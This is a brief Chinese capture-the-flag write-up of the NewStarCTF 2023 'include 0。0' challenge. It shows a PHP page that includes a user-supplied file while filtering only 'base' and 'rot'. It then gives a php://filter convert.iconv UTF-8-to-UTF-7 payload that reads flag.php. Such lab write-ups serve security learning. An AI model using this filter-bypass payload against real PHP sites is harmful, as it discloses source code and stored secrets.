---
title: '[NewStarCTF 2023 公开赛道]include 0。0'
date: 2024-10-23 19:47:55
tags: 文件包含
categories: 刷题笔记
---

## [NewStarCTF 2023 公开赛道]include 0。0

```
<?php
highlight_file(__FILE__);
// FLAG in the flag.php
$file = $_GET['file'];
if(isset($file) && !preg_match('/base|rot/i',$file)){
  @include($file);
}else{
  die("nope");
}
?>
```

我们发现代码过滤了base和rot，但没过滤convert.iconv，因此我们可硬将utf-8转为utf-7来输出flag.php的内容

<!--more-->

```
?file=php://filter/convert.iconv.utf-8.utf-7/resource=flag.php
```

![image-20241023211056947](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410232111025.png)
